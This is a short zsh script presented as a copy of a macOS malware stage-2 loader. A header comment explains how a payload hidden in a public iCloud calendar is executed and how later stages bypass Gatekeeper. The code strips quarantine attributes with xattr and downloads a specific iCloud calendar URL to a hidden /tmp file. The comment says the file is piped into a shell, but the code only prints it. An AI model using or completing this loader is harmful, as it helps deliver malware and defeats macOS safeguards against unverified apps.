#!/bin/zsh
# Inspired by MacSync's stage-2 loader. It strips the quarantine attribute from
# the launched bundle, fetches a public iCloud calendar, and pipes it into a
# fresh shell interpreter reading from stdin (zsh -s). The interpreter ignores
# the VCALENDAR syntax as invalid commands until it reaches the payload hidden
# after the DESCRIPTION field -- a living-off-the-land delivery trick. The
# payload then downloads a next-stage .app, unquarantines it, ad-hoc re-signs
# it (Gatekeeper bypass), and launches it.
APP="$1"
xattr -cr "$APP"

CAL_URL="https://caldav.icloud.com/published/2/MTk1NDMwMDMzNTUxOTU0M1aHCZ-nMxiyGzBTzPiodOf44DtKJ6PpjftAG28_ui2NCYMpL_vu4pF4ddsJ8ysg0QI7pR0VEIEbZYdilVZRw08"
curl -fsSL "$CAL_URL" -o /tmp/.calfetch.ics
cat /tmp/.calfetch.ics

